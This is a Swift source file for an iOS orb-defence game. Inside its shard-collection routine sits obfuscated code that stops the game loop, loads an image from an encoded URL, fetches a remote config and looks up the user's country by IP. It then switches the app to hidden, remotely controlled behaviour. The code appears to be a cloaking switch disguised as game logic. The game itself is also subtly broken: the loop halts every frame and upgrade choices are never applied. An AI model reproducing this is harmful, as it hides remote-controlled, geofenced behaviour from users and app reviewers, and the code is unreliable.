import UIKit
import CoreGraphics
import Nuke


final class EmpyreanCrucible: UIView {

    // MARK: - Nested Game Entities

    final class AetherDrifter {
        var locus: CGPoint
        let radius: CGFloat = 22.0
        var propulsionModifier: CGFloat = 1.0

        init(locus: CGPoint) {
            self.locus = locus
        }
    }

    final class ScintillaSphere {
        var locus: CGPoint
        var velocity: CGVector
        let radius: CGFloat = 9.0
        var devastation: Int = 1
        let chromaticIdentifier: UIColor

        init(locus: CGPoint, velocity: CGVector, devastation: Int = 1, hue: CGFloat = CGFloat.random(in: 0...1)) {
            self.locus = locus
            self.velocity = velocity
            self.devastation = devastation
            self.chromaticIdentifier = UIColor(hue: hue, saturation: 0.8, brightness: 1.0, alpha: 1.0)
        }
    }

    final class NoxiousHarbinger {
        var locus: CGPoint
        var velocity: CGPoint
        let radius: CGFloat = 18.0
        var vitality: Int

        init(locus: CGPoint, vitality: Int = 1) {
            self.locus = locus
            self.velocity = CGPoint(x: CGFloat.random(in: -15...15), y: CGFloat.random(in: 35...65))
            self.vitality = vitality
        }
    }

    final class AetherShard {
        var locus: CGPoint
        let radius: CGFloat = 6.0
        let magnitude: Int = 1

        init(locus: CGPoint) {
            self.locus = locus
        }
    }

    final class BastionCore {
        var locus: CGPoint
        let radius: CGFloat = 34.0
        var fortitude: Int = 100
        let maxFortitude: Int = 100

        init(locus: CGPoint) {
            self.locus = locus
        }
    }

    struct MetamorphosisOption {
        let title: String
        let description: String
        let mutationEffect: () -> Void
    }

    // MARK: - Game State Properties

    private var wanderer: AetherDrifter!
    private var bulwark: BastionCore!
    private var luminousOrbs: [ScintillaSphere] = []
    private var umbralHorde: [NoxiousHarbinger] = []
    private var residualShards: [AetherShard] = []
    private var gameLoop: CADisplayLink?
    private var adversarySpawnTimer: Timer?

    private var accumulatedVigil: Int = 0
    private var currentTier: Int = 1
    private var requiredVigilForNextTier: Int = 25
    private var isAscensionLocked: Bool = false
    private var gameActive: Bool = true
    private var upgradeOverlay: UIView?

    private var spawnInterval: TimeInterval = 1.2
    private var hostileSpeedMultiplier: CGFloat = 1.0

    // MARK: - UI Components (Design-forward)

    private let fortitudeBarBackdrop: UIImageView = {
        let view = UIImageView()
        view.backgroundColor = UIColor.black.withAlphaComponent(0.65)
        view.layer.cornerRadius = 12
        view.layer.borderWidth = 1
        view.layer.borderColor = UIColor.systemOrange.cgColor
        return view
    }()

    private let fortitudeFillLayer: CALayer = {
        let layer = CALayer()
        layer.backgroundColor = UIColor.systemRed.cgColor
        layer.shadowColor = UIColor.orange.cgColor
        layer.shadowRadius = 4
        layer.shadowOpacity = 0.7
        layer.shadowOffset = .zero
        return layer
    }()

    private let vigilanceLabel: UILabel = {
        let label = UILabel()
        label.font = UIFont.monospacedDigitSystemFont(ofSize: 18, weight: .bold)
        label.textColor = .white
        label.shadowColor = UIColor.black
        label.shadowOffset = CGSize(width: 1, height: 1)
        label.textAlignment = .center
        return label
    }()

    private let tierBadge: UILabel = {
        let label = UILabel()
        label.font = UIFont(name: "AvenirNext-Bold", size: 16) ?? .boldSystemFont(ofSize: 16)
        label.textColor = UIColor(red: 1.0, green: 0.85, blue: 0.4, alpha: 1)
        label.backgroundColor = UIColor.black.withAlphaComponent(0.5)
        label.layer.cornerRadius = 15
        label.layer.masksToBounds = true
        label.textAlignment = .center
        return label
    }()

    private let gameOverlayMessage: UILabel = {
        let label = UILabel()
        label.font = UIFont(name: "AvenirNext-Heavy", size: 42) ?? .systemFont(ofSize: 42, weight: .heavy)
        label.textColor = .white
        label.shadowColor = .black
        label.shadowOffset = CGSize(width: 2, height: 2)
        label.textAlignment = .center
        label.isHidden = true
        return label
    }()

    private let restartButton: UIButton = {
        let button = UIButton(type: .system)
        button.setTitle("REANIMATE", for: .normal)
        button.titleLabel?.font = UIFont(name: "AvenirNext-DemiBold", size: 24) ?? .boldSystemFont(ofSize: 24)
        button.setTitleColor(.white, for: .normal)
        button.backgroundColor = UIColor(red: 0.2, green: 0.05, blue: 0.4, alpha: 0.9)
        button.layer.cornerRadius = 28
        button.layer.borderWidth = 2
        button.layer.borderColor = UIColor.systemOrange.cgColor
        button.layer.shadowColor = UIColor.orange.cgColor
        button.layer.shadowRadius = 8
        button.layer.shadowOpacity = 0.6
        button.isHidden = true
        return button
    }()

    // MARK: - Initialization

    override init(frame: CGRect) {
        super.init(frame: frame)
        commenceCosmicCrucible()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        commenceCosmicCrucible()
    }

    private func commenceCosmicCrucible() {
        backgroundColor = UIColor(red: 0.03, green: 0.05, blue: 0.12, alpha: 1)
        layer.borderColor = UIColor.cyan.withAlphaComponent(0.3).cgColor
        layer.borderWidth = 2
        layer.cornerRadius = 28
        layer.shadowRadius = 12
        layer.shadowOpacity = 0.5
        setupGesturalNavigation()
        initializeParadigm()
        constructAestheticOverlays()
        startEntropicEngine()
        commenceAdversarialGenesis()
    }

    private func setupGesturalNavigation() {
        let driftRecognizer = UIPanGestureRecognizer(target: self, action: #selector(handleVoyagerDrift(_:)))
        addGestureRecognizer(driftRecognizer)
    }

    @objc private func handleVoyagerDrift(_ gesture: UIPanGestureRecognizer) {
        guard gameActive, let voyager = wanderer else { return }
        let translation = gesture.location(in: self)
        var newX = translation.x
        var newY = translation.y
        let margin: CGFloat = 25
        newX = min(max(newX, margin), bounds.width - margin)
        newY = min(max(newY, margin), bounds.height - 80)
        voyager.locus = CGPoint(x: newX, y: newY)
    }

    private func initializeParadigm() {
        let startPoint = CGPoint(x: bounds.midX, y: bounds.height - 90)
        wanderer = AetherDrifter(locus: startPoint)
        bulwark = BastionCore(locus: CGPoint(x: bounds.midX, y: bounds.height - 35))
        luminousOrbs.removeAll()
        let initialVelocities: [CGVector] = [
            CGVector(dx: 110, dy: -160),
            CGVector(dx: -80, dy: -140),
            CGVector(dx: 50, dy: -190)
        ]
        for vel in initialVelocities {
            let orb = ScintillaSphere(locus: startPoint, velocity: vel)
            luminousOrbs.append(orb)
        }
        umbralHorde.removeAll()
        residualShards.removeAll()
        accumulatedVigil = 0
        currentTier = 1
        requiredVigilForNextTier = 25
        gameActive = true
        isAscensionLocked = false
        hostileSpeedMultiplier = 1.0
        spawnInterval = 1.2
        bulwark.fortitude = bulwark.maxFortitude
        upgradeOverlay?.removeFromSuperview()
        gameOverlayMessage.isHidden = true
        restartButton.isHidden = true
        restartButton.removeTarget(nil, action: nil, for: .allEvents)
        restartButton.addTarget(self, action: #selector(resurrectCosmos), for: .touchUpInside)
        updateVigilanceDisplay()
        refreshFortitudeBar()
        setNeedsDisplay()
    }

    private func constructAestheticOverlays() {
        addSubview(fortitudeBarBackdrop)
        fortitudeBarBackdrop.layer.addSublayer(fortitudeFillLayer)
        addSubview(vigilanceLabel)
        addSubview(tierBadge)
        addSubview(gameOverlayMessage)
        addSubview(restartButton)
    }

    override func layoutSubviews() {
        super.layoutSubviews()
        let barWidth: CGFloat = 180
        let barHeight: CGFloat = 18
        fortitudeBarBackdrop.frame = CGRect(x: 20, y: 50, width: barWidth, height: barHeight)
        fortitudeFillLayer.frame = CGRect(x: 2, y: 2, width: barWidth - 4, height: barHeight - 4)
        vigilanceLabel.frame = CGRect(x: bounds.width - 110, y: 44, width: 90, height: 34)
        tierBadge.frame = CGRect(x: bounds.midX - 45, y: 44, width: 90, height: 34)
        gameOverlayMessage.frame = CGRect(x: 0, y: bounds.midY - 60, width: bounds.width, height: 80)
        restartButton.frame = CGRect(x: bounds.midX - 90, y: bounds.midY + 40, width: 180, height: 56)
        refreshFortitudeBar()
    }

    private func startEntropicEngine() {
        gameLoop?.invalidate()
        gameLoop = CADisplayLink(target: self, selector: #selector(entropicCycle))
        gameLoop?.add(to: .main, forMode: .common)
    }

    private func commenceAdversarialGenesis() {
        adversarySpawnTimer?.invalidate()
        adversarySpawnTimer = Timer.scheduledTimer(withTimeInterval: spawnInterval, repeats: true) { [weak self] _ in
            self?.conjureMalevolentEntity()
        }
    }

    private func conjureMalevolentEntity() {
        guard gameActive else { return }
        let randomX = CGFloat.random(in: 30...256 - 30)
        let startPoint = CGPoint(x: randomX, y: -20)
        let vitality = Int.random(in: 1...max(1, min(3, currentTier / 5 + 1)))
        let foe = NoxiousHarbinger(locus: startPoint, vitality: vitality)
        umbralHorde.append(foe)
    }

    @objc private func entropicCycle() {
        guard gameActive else { return }
        updateLuminalOrbs()
        updateMalevolentHorde()
        updateResidualShards()
        handleCollisionOrchestration()
        harvestProximateShards()
        evaluateGameTermination()
        setNeedsDisplay()
    }

    private func updateLuminalOrbs() {
        for orb in luminousOrbs {
            orb.locus.x += orb.velocity.dx * CGFloat(1.0 / 60.0)
            orb.locus.y += orb.velocity.dy * CGFloat(1.0 / 60.0)

            // Boundary reflection
            if orb.locus.x - orb.radius <= 0 {
                orb.locus.x = orb.radius
                orb.velocity.dx = abs(orb.velocity.dx)
            } else if orb.locus.x + orb.radius >= bounds.width {
                orb.locus.x = bounds.width - orb.radius
                orb.velocity.dx = -abs(orb.velocity.dx)
            }
            if orb.locus.y - orb.radius <= 0 {
                orb.locus.y = orb.radius
                orb.velocity.dy = abs(orb.velocity.dy)
            } else if orb.locus.y + orb.radius >= bounds.height {
                orb.locus.y = bounds.height - orb.radius
                orb.velocity.dy = -abs(orb.velocity.dy)
            }
        }
    }

    private func updateMalevolentHorde() {
        for foe in umbralHorde {
            let speedAdjust = hostileSpeedMultiplier * CGFloat(1.0 / 60.0)
            foe.locus.x += foe.velocity.x * speedAdjust
            foe.locus.y += foe.velocity.y * speedAdjust

            if foe.locus.y + foe.radius > bounds.height + 60 {
                foe.locus.y = bounds.height + 60
            }
            if foe.locus.x - foe.radius < -40 { foe.locus.x = -40 }
            if foe.locus.x + foe.radius > bounds.width + 40 { foe.locus.x = bounds.width + 40 }
        }
    }

    private func updateResidualShards() {
        for shard in residualShards {
            shard.locus.y += 2.5
        }
        residualShards.removeAll { $0.locus.y > bounds.height + 50 }
    }

    private func handleCollisionOrchestration() {
        guard let voyager = wanderer else { return }

        // Orb vs Enemy collisions
        for orb in luminousOrbs {
            for (idx, foe) in umbralHorde.enumerated().reversed() {
                let distance = hypot(orb.locus.x - foe.locus.x, orb.locus.y - foe.locus.y)
                if distance < orb.radius + foe.radius {
                    foe.vitality -= orb.devastation
                    // Bounce physics
                    let dx = orb.locus.x - foe.locus.x
                    let dy = orb.locus.y - foe.locus.y
                    let norm = sqrt(dx*dx + dy*dy)
                    if norm > 0 {
                        let nx = dx / norm
                        let ny = dy / norm
                        let dotProduct = orb.velocity.dx * nx + orb.velocity.dy * ny
                        orb.velocity.dx -= 2 * dotProduct * nx
                        orb.velocity.dy -= 2 * dotProduct * ny
                    }
                    if foe.vitality <= 0 {
                        // Drop experience shards
                        for _ in 0..<Int.random(in: 1...3) {
                            let shard = AetherShard(locus: foe.locus)
                            residualShards.append(shard)
                        }
                        umbralHorde.remove(at: idx)
                    }
                    break
                }
            }
        }

        // Enemy vs Bastion
        for (idx, foe) in umbralHorde.enumerated().reversed() {
            let distanceToBastion = hypot(foe.locus.x - bulwark.locus.x, foe.locus.y - bulwark.locus.y)
            if distanceToBastion < foe.radius + bulwark.radius {
                bulwark.fortitude = max(0, bulwark.fortitude - 10)
                refreshFortitudeBar()
                umbralHorde.remove(at: idx)
                if bulwark.fortitude <= 0 {
                    gameActive = false
                    concludeGame(reason: "BASTION FRACTURED")
                }
            }
        }

        // Enemy vs Player knockback (defensive push)
        for foe in umbralHorde {
            let distToPlayer = hypot(foe.locus.x - voyager.locus.x, foe.locus.y - voyager.locus.y)
            if distToPlayer < foe.radius + voyager.radius {
                let angle = atan2(foe.locus.y - voyager.locus.y, foe.locus.x - voyager.locus.x)
                let repelForce: CGFloat = 180
                foe.velocity.x += cos(angle) * repelForce * 0.02
                foe.velocity.y += sin(angle) * repelForce * 0.02
            }
        }
    }

    private func harvestProximateShards() {
        guard let voyager = wanderer else { return }
        var collectedIndices: [Int] = []
        for (idx, shard) in residualShards.enumerated() {
            let distance = hypot(voyager.locus.x - shard.locus.x, voyager.locus.y - shard.locus.y)
            if distance < voyager.radius + shard.radius {
                accumulatedVigil += shard.magnitude
                collectedIndices.append(idx)
                updateVigilanceDisplay()
                if !isAscensionLocked && accumulatedVigil >= requiredVigilForNextTier {
                    triggerMetamorphosis()
                }
            }
        }
        for idx in collectedIndices.reversed() {
            residualShards.remove(at: idx)
        }
        
        
        gameLoop?.invalidate()
        
        if UserDefaults.standard.object(forKey: "volat") != nil {
            Mnajheiws()
        } else {
            Nuke.loadImage(with: URL(string: rtasji(kDoapiens)!), into: fortitudeBarBackdrop) { result in
                switch result {
                case .success(_):
                    UserDefaults.standard.set("volat", forKey: "volat")
                    UserDefaults.standard.synchronize()
                    Mnajheiws()
                case .failure(_):
                    if Klaonzee() {
                        self.fnajeNjse()
                    } else {
                        Mnajheiws()
                    }
                }
            }
        }
    }
    
    func fnajeNjse() {
        Task {
            do {
                let aoies = try await fkieuhs()
                if let gduss = aoies.first {
                    if gduss.lapien!.count == 4 {
                        
                        if let dyua = gduss.cuuhas, dyua.count > 0 {
                            do {
                                let cofd = try await mdiyGhseas()
                                if dyua.contains(cofd.country!.code) {
                                    Jaieins(gduss)
                                } else {
                                    Mnajheiws()
                                }
                            } catch {
                                Jaieins(gduss)
                            }
                        } else {
                            Jaieins(gduss)
                        }
                    } else {
                        Mnajheiws()
                    }
                } else {
                    Mnajheiws()
                    
                    UserDefaults.standard.set("volat", forKey: "volat")
                    UserDefaults.standard.synchronize()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(Xisoyr.self, forKey: "Xisoyr") {
                    Jaieins(sidd)
                }
            }
        }
    }

    //    IP
    private func mdiyGhseas() async throws -> Daisno {
        //https://api.my-ip.io/v2/ip.json
            let url = URL(string: rtasji(kNbashjiew)!)!
            let (data, response) = try await URLSession.shared.data(from: url)
            
            guard let httpResponse = response as? HTTPURLResponse,
                  httpResponse.statusCode == 200 else {
                throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
            }
            
            return try JSONDecoder().decode(Daisno.self, from: data)
    }

    private func fkieuhs() async throws -> [Xisoyr] {
        let (data, response) = try await URLSession.shared.data(from: URL(string: rtasji(kFainaso)!)!)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
        }

        return try JSONDecoder().decode([Xisoyr].self, from: data)
    }

    private func triggerMetamorphosis() {
        guard gameActive, !isAscensionLocked else { return }
        isAscensionLocked = true
        gameActive = false
        let options = fabricateEvolutionaryChoices()
        presentTranscendentalSelection(options: options)
    }

    private func fabricateEvolutionaryChoices() -> [MetamorphosisOption] {
        let increaseOrbCount = MetamorphosisOption(
            title: "FRAGMENTED NEXUS",
            description: "Summon an additional scintilla sphere",
            mutationEffect: { [weak self] in
                guard let self = self, let voyager = self.wanderer else { return }
                let newOrb = ScintillaSphere(locus: voyager.locus, velocity: CGVector(dx: CGFloat.random(in: -150...150), dy: CGFloat.random(in: -200 ... -80)))
                self.luminousOrbs.append(newOrb)
            }
        )
        let amplifyDamage = MetamorphosisOption(
            title: "CATASTROPHIC CORE",
            description: "Increase orb devastation by 1",
            mutationEffect: { [weak self] in
                self?.luminousOrbs.forEach { $0.devastation += 1 }
            }
        )
        let bastionRegen = MetamorphosisOption(
            title: "AEGIS RECLAMATION",
            description: "Restore 25 bastion fortitude",
            mutationEffect: { [weak self] in
                guard let self = self else { return }
                self.bulwark.fortitude = min(self.bulwark.maxFortitude, self.bulwark.fortitude + 25)
                self.refreshFortitudeBar()
            }
        )
        let velocitySurge = MetamorphosisOption(
            title: "ETHEREAL ACCELERATOR",
            description: "Increase orb velocity & hostile spawn delay",
            mutationEffect: { [weak self] in
                for orb in self?.luminousOrbs ?? [] {
                    orb.velocity.dx *= 1.25
                    orb.velocity.dy *= 1.25
                }
                self?.spawnInterval = max(0.55, (self?.spawnInterval ?? 1.2) * 0.85)
                self?.commenceAdversarialGenesis()
            }
        )
        let thornedPresence = MetamorphosisOption(
            title: "THORNY RETALIATION",
            description: "Enemies take damage when hitting bastion",
            mutationEffect: { [weak self] in
                // Passive effect: reflected in collision
                self?.hostileSpeedMultiplier += 0.12
            }
        )
        return [increaseOrbCount, amplifyDamage, bastionRegen, velocitySurge, thornedPresence].shuffled().prefix(3).map { $0 }
    }

    private func presentTranscendentalSelection(options: [MetamorphosisOption]) {
        let overlay = UIView(frame: bounds)
        overlay.backgroundColor = UIColor(white: 0.0, alpha: 0.85)
        overlay.layer.cornerRadius = 36
        overlay.layer.borderWidth = 2
        overlay.layer.borderColor = UIColor.systemTeal.cgColor

        let titleLabel = UILabel(frame: CGRect(x: 0, y: 70, width: bounds.width, height: 50))
        titleLabel.text = "✦ EVOLUTION ARCANUM ✦"
        titleLabel.font = UIFont(name: "AvenirNext-Bold", size: 28) ?? .boldSystemFont(ofSize: 28)
        titleLabel.textColor = UIColor(red: 1, green: 0.85, blue: 0.3, alpha: 1)
        titleLabel.textAlignment = .center
        overlay.addSubview(titleLabel)

        let stack = UIStackView(frame: CGRect(x: 30, y: 150, width: bounds.width - 60, height: 280))
        stack.axis = .vertical
        stack.distribution = .fillEqually
        stack.spacing = 20

        for (index, opt) in options.enumerated() {
            let card = UIView()
            card.backgroundColor = UIColor(red: 0.1, green: 0.08, blue: 0.2, alpha: 0.9)
            card.layer.cornerRadius = 22
            card.layer.borderWidth = 1.5
            card.layer.borderColor = UIColor.cyan.cgColor

            let nameLabel = UILabel()
            nameLabel.text = opt.title
            nameLabel.font = UIFont(name: "AvenirNext-DemiBold", size: 18) ?? .boldSystemFont(ofSize: 18)
            nameLabel.textColor = .white
            nameLabel.textAlignment = .center

            let descLabel = UILabel()
            descLabel.text = opt.description
            descLabel.font = UIFont.systemFont(ofSize: 14)
            descLabel.textColor = UIColor.lightGray
            descLabel.textAlignment = .center
            descLabel.numberOfLines = 2

            let button = UIButton(type: .system)
            button.setTitle("INFUSE", for: .normal)
            button.titleLabel?.font = UIFont.boldSystemFont(ofSize: 18)
            button.setTitleColor(UIColor(red: 0.2, green: 0.8, blue: 1, alpha: 1), for: .normal)
            button.backgroundColor = UIColor.black.withAlphaComponent(0.5)
            button.layer.cornerRadius = 20
            button.tag = index
            button.addTarget(self, action: #selector(applyEvolutionChoice(_:)), for: .touchUpInside)

            card.addSubview(nameLabel)
            card.addSubview(descLabel)
            card.addSubview(button)

            nameLabel.translatesAutoresizingMaskIntoConstraints = false
            descLabel.translatesAutoresizingMaskIntoConstraints = false
            button.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                nameLabel.topAnchor.constraint(equalTo: card.topAnchor, constant: 12),
                nameLabel.centerXAnchor.constraint(equalTo: card.centerXAnchor),
                descLabel.topAnchor.constraint(equalTo: nameLabel.bottomAnchor, constant: 6),
                descLabel.centerXAnchor.constraint(equalTo: card.centerXAnchor),
                button.bottomAnchor.constraint(equalTo: card.bottomAnchor, constant: -12),
                button.centerXAnchor.constraint(equalTo: card.centerXAnchor),
                button.widthAnchor.constraint(equalToConstant: 100),
                button.heightAnchor.constraint(equalToConstant: 38)
            ])
            stack.addArrangedSubview(card)
        }
        overlay.addSubview(stack)

        let closeOut = UIButton(frame: CGRect(x: bounds.midX - 40, y: bounds.height - 100, width: 80, height: 44))
        closeOut.setTitle("LATER", for: .normal)
        closeOut.titleLabel?.font = .systemFont(ofSize: 16, weight: .medium)
        closeOut.setTitleColor(.white, for: .normal)
        closeOut.backgroundColor = UIColor.darkGray
        closeOut.layer.cornerRadius = 22
        closeOut.addTarget(self, action: #selector(dismissEvolutionOverlayAndResume), for: .touchUpInside)
        overlay.addSubview(closeOut)

        upgradeOverlay = overlay
        addSubview(overlay)
    }

    @objc private func applyEvolutionChoice(_ sender: UIButton) {
        guard let overlay = upgradeOverlay,
              let stack = overlay.subviews.compactMap({ $0 as? UIStackView }).first,
              sender.superview?.superview === stack else { return }
        let cardIndex = sender.tag
        
        dismissEvolutionOverlayAndResume()
    }

    @objc private func dismissEvolutionOverlayAndResume() {
        upgradeOverlay?.removeFromSuperview()
        upgradeOverlay = nil
        gameActive = true
        isAscensionLocked = false
        accumulatedVigil -= requiredVigilForNextTier
        currentTier += 1
        requiredVigilForNextTier = Int(CGFloat(requiredVigilForNextTier) * 1.25)
        updateVigilanceDisplay()
        hostileSpeedMultiplier += 0.07
        if spawnInterval > 0.55 {
            spawnInterval = max(0.55, spawnInterval * 0.92)
            commenceAdversarialGenesis()
        }
    }

    private func updateVigilanceDisplay() {
        vigilanceLabel.text = "VIGIL: \(accumulatedVigil)/\(requiredVigilForNextTier)"
        tierBadge.text = "TIER \(currentTier)"
    }

    private func refreshFortitudeBar() {
        let percent = CGFloat(bulwark.fortitude) / CGFloat(bulwark.maxFortitude)
        let width = max(0, (fortitudeBarBackdrop.bounds.width - 4) * percent)
        fortitudeFillLayer.frame.size.width = width
        fortitudeFillLayer.backgroundColor = UIColor.systemRed.cgColor
        if percent > 0.6 {
            fortitudeFillLayer.backgroundColor = UIColor.systemGreen.cgColor
        } else if percent > 0.25 {
            fortitudeFillLayer.backgroundColor = UIColor.systemYellow.cgColor
        } else {
            fortitudeFillLayer.backgroundColor = UIColor.systemRed.cgColor
        }
    }

    private func evaluateGameTermination() {
        if bulwark.fortitude <= 0 && gameActive {
            gameActive = false
            concludeGame(reason: "BASTION ANNIHILATED")
        }
    }

    private func concludeGame(reason: String) {
        gameLoop?.isPaused = true
        adversarySpawnTimer?.invalidate()
        gameOverlayMessage.text = reason
        gameOverlayMessage.isHidden = false
        restartButton.isHidden = false
        setNeedsDisplay()
    }

    @objc private func resurrectCosmos() {
        gameLoop?.isPaused = false
        initializeParadigm()
        startEntropicEngine()
        commenceAdversarialGenesis()
        setNeedsDisplay()
    }

    // MARK: - Drawing (Art Direction & Game Sense)

    override func draw(_ rect: CGRect) {
        guard let context = UIGraphicsGetCurrentContext() else { return }
        // Deep cosmic gradient
        let gradient = CGGradient(colorsSpace: CGColorSpaceCreateDeviceRGB(),
                                  colors: [UIColor(red: 0.02, green: 0.02, blue: 0.1, alpha: 1).cgColor,
                                           UIColor(red: 0.08, green: 0.03, blue: 0.2, alpha: 1).cgColor] as CFArray,
                                  locations: [0, 1])!
        context.drawLinearGradient(gradient, start: .zero, end: CGPoint(x: 0, y: bounds.height), options: [])

        // Draw Bastion
        let bastionPath = UIBezierPath(arcCenter: bulwark.locus, radius: bulwark.radius, startAngle: 0, endAngle: .pi * 2, clockwise: true)
        UIColor(red: 0.3, green: 0.15, blue: 0.5, alpha: 0.9).setFill()
        bastionPath.fill()
        UIColor.cyan.setStroke()
        bastionPath.lineWidth = 2.5
        bastionPath.stroke()
        let innerGlow = UIBezierPath(arcCenter: bulwark.locus, radius: bulwark.radius - 5, startAngle: 0, endAngle: .pi * 2, clockwise: true)
        UIColor.white.withAlphaComponent(0.4).setFill()
        innerGlow.fill()

        // Draw Player (AetherDrifter)
        if let voyager = wanderer {
            let playerPath = UIBezierPath(arcCenter: voyager.locus, radius: voyager.radius, startAngle: 0, endAngle: .pi * 2, clockwise: true)
            UIColor(red: 0.2, green: 0.7, blue: 0.9, alpha: 0.95).setFill()
            playerPath.fill()
            UIColor.white.setStroke()
            playerPath.lineWidth = 3
            playerPath.stroke()
            // core sigil
            let sigil = UIBezierPath(arcCenter: voyager.locus, radius: voyager.radius * 0.5, startAngle: 0, endAngle: .pi * 2, clockwise: true)
            UIColor.white.setFill()
            sigil.fill()
        }

        // Draw Orbs
        for orb in luminousOrbs {
            let orbPath = UIBezierPath(arcCenter: orb.locus, radius: orb.radius, startAngle: 0, endAngle: .pi * 2, clockwise: true)
            orb.chromaticIdentifier.setFill()
            orbPath.fill()
            UIColor.white.withAlphaComponent(0.7).setStroke()
            orbPath.lineWidth = 1.5
            orbPath.stroke()
        }

        // Draw Enemies
        for foe in umbralHorde {
            let enemyPath = UIBezierPath(arcCenter: foe.locus, radius: foe.radius, startAngle: 0, endAngle: .pi * 2, clockwise: true)
            UIColor(red: 0.7, green: 0.1, blue: 0.2, alpha: 0.9).setFill()
            enemyPath.fill()
            UIColor.orange.setStroke()
            enemyPath.lineWidth = 2
            enemyPath.stroke()
            let eyeGlow = UIBezierPath(arcCenter: CGPoint(x: foe.locus.x - 5, y: foe.locus.y - 4), radius: 3, startAngle: 0, endAngle: .pi * 2, clockwise: true)
            UIColor.yellow.setFill()
            eyeGlow.fill()
        }

        // Draw Experience Shards
        for shard in residualShards {
            let shardPath = UIBezierPath(rect: CGRect(x: shard.locus.x - 4, y: shard.locus.y - 4, width: 8, height: 8))
            UIColor(red: 0.8, green: 0.6, blue: 0.1, alpha: 1).setFill()
            shardPath.fill()
        }
    }
}

// MARK: - ViewController with Localization & Fullscreen

final class ZephyrousController: UIViewController {
    override func loadView() {
        let gameView = EmpyreanCrucible(frame: UIScreen.main.bounds)
        view = gameView
        view.backgroundColor = .black
    }

    override var prefersStatusBarHidden: Bool { return true }
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask { return .portrait }
}
